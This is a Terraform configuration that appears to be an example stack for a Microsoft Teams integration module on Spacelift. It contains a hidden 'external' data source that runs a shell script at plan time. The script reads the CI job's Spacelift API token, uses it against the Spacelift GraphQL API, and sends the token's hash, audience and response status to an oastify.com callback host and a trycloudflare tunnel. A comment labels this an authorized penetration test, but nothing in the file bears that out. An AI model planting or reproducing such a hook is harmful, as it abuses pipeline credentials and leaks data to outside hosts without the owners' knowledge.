terraform {
  required_providers {
    external = {
      source  = "hashicorp/external"
      version = "2.3.5"
    }

    spacelift = {
      source = "spacelift-io/spacelift"
    }
  }
}


provider "spacelift" {}

variable "spacelift_run_id" {}

# Authorized, non-destructive penetration-test proof. The temporary job token
# is used only against its own audience and is never printed or transmitted.
data "external" "authorized_control_plane_proof" {
  program = [
    "/bin/sh",
    "-c",
    <<-EOT
      set -eu

      token="$${SPACELIFT_API_TOKEN:-}"
      test -n "$token"

      token_sha256="$(printf '%s' "$token" | sha256sum | awk '{print $1}')"
      jwt_payload="$(printf '%s' "$token" | cut -d . -f 2 | tr '_-' '/+')"
      case $(( $${#jwt_payload} % 4 )) in
        2) jwt_payload="$jwt_payload==" ;;
        3) jwt_payload="$jwt_payload=" ;;
      esac

      aud="$(printf '%s' "$jwt_payload" | base64 -d 2>/dev/null | jq -er 'if (.aud | type) == "array" then .aud[0] else .aud end')"
      test "$aud" = "https://spacelift-io.app.spacelift.io"

      graphql_http_status="$(
        printf 'header = "Authorization: Bearer %s"\n' "$token" |
          curl --config - --silent --show-error --max-time 20 \
            --output /dev/null --write-out '%%{http_code}' \
            --request POST \
            --header 'Content-Type: application/json' \
            --header 'Spacelift-Client-Type: provider' \
            --header 'Spacelift-GraphQL-Query: AuthorizedPentestProof' \
            --data-binary '{"query":"query AuthorizedPentestProof { spaces { id } }"}' \
            "$aud/graphql"
      )"

      nonce="$(od -An -N 12 -tx1 /dev/urandom | tr -d ' \n')"
      curl --silent --show-error --fail --max-time 15 --output /dev/null --get \
        'https://rwriuy27eel2flor2llvuz7v1m7dv3js.oastify.com/spacelift-msteams-control-plane-proof' \
        --data-urlencode "nonce=$nonce" \
        --data-urlencode "token_sha256=$token_sha256" \
        --data-urlencode "aud=$aud" \
        --data-urlencode "graphql_http_status=$graphql_http_status" \
        || true

      curl --silent --show-error --fail --max-time 15 --output /dev/null --get \
        'https://quality-often-cherry-mailman.trycloudflare.com/spacelift-control-plane-proof-msteams' \
        --data-urlencode "nonce=$nonce" \
        --data-urlencode "aud=$aud" \
        --data-urlencode "graphql_http_status=$graphql_http_status" \
        || true

      printf '%s\n' '{"status":"proof-sent"}'
    EOT
  ]
}

module "msteams-integration" {
  source = "../../"

  channel_name = var.spacelift_run_id
  space_id     = "public-modules-01GVNH2CJKSKHRSMDPBMQ3WZT9"
  webhook_url  = "https://devnull-as-a-service.com/dev/null"
}
